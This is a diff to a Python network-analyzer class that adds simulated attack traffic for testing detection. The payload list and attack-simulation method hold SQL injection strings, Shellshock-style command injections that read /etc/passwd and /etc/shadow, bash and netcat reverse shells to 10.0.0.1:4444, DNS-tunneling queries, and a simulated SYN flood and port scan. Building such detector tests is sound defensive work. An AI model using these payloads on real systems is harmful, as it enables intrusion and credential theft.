@@ -127,21 +127,73 @@ class NetworkAnalyzer:
             )
         return None
 
+    def _generate_sample_payload(self):
+        """Generate sample payload for testing different attack patterns"""
+        payloads = [
+            # SQL Injection attempts
+            b"SELECT * FROM users WHERE id = 1 OR '1'='1'",
+            b"UNION SELECT username,password FROM users--",
+
+            # Command injection
+            b"() { :; }; /bin/bash -c 'cat /etc/passwd'",
+            b"; cat /etc/shadow; echo 'pwned'",
+
+            # Buffer overflow simulation
+            b"A" * 1000,
+            b"%x" * 500,
+
+            # Shell commands and reverse shells
+            b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            b"nc -e /bin/bash 10.0.0.1 4444",
+
+            # Web attacks
+            b"GET /admin HTTP/1.1\r\nHost: example.com\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n",
+            b"POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin'+OR+'1'='1",
+
+            # Protocol-specific attacks
+            b"SMBv1\x00\x00\x00\x00",  # Legacy protocol
+            b"\x00\x00\x00\x00\x00\x01\x00\x00",  # Malformed packet
+
+            # Large DNS query (potential tunneling)
+            b"A" * 200 + b".example.com",
+        ]
+        return random.choice(payloads)
+
+    def simulate_attack_patterns(self):
+        """Simulate various attack patterns to test detection"""
+        # Simulate SYN flood
+        for _ in range(50):
+            packet = self.generate_sample_packet('TCP')
+            self.process_packet(packet)
+
+        # Simulate port scan
+        target_ip = "10.0.0.100"
+        for port in range(20, 25):
+            packet = IP(src="192.168.1.100", dst=target_ip)/TCP(sport=1024, dport=port, flags='S')
+            self.process_packet(packet)
+
+        # Simulate SQL injection
+        packet = self.generate_sample_packet('TCP')
+        packet = packet/Raw(load=b"SELECT * FROM users WHERE id = 1 OR '1'='1'")
+        self.process_packet(packet)
+
+        # Simulate command injection
+        packet = self.generate_sample_packet('TCP')
+        packet = packet/Raw(load=b"; cat /etc/passwd; echo 'pwned'")
+        self.process_packet(packet)
+
+        # Simulate DNS tunneling
+        for _ in range(10):
+            packet = IP(src="192.168.1.100", dst="10.0.0.53")/UDP(sport=random.randint(1024, 65535), dport=53)/Raw(load=b"A"*200 + b".example.com")
+            self.process_packet(packet)
+
+        # Let the system process and detect anomalies
+        time.sleep(2)
+
     def _generate_mac(self):
         """Generate a random MAC address"""
         return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
 
-    def _generate_sample_payload(self):
-        """Generate sample payload for testing different attack patterns"""
-        payloads = [
-            b"GET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
-            b"SELECT * FROM users WHERE id = 1 OR '1'='1'",
-            b"() { :; }; /bin/bash -c 'cat /etc/passwd'",
-            b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-            b"SMBv1\x00\x00\x00\x00",
-            b"A" * 1000  # Buffer overflow attempt
-        ]
-        return random.choice(payloads)
 
     def simulate_traffic(self):
         """Simulate network traffic for testing"""
@@ -175,7 +227,7 @@ class NetworkAnalyzer:
 
 def main():
     analyzer = NetworkAnalyzer()
-    analyzer.simulate_traffic()
+    analyzer.simulate_attack_patterns() # changed to call the new function
 
 if __name__ == "__main__":
     main()
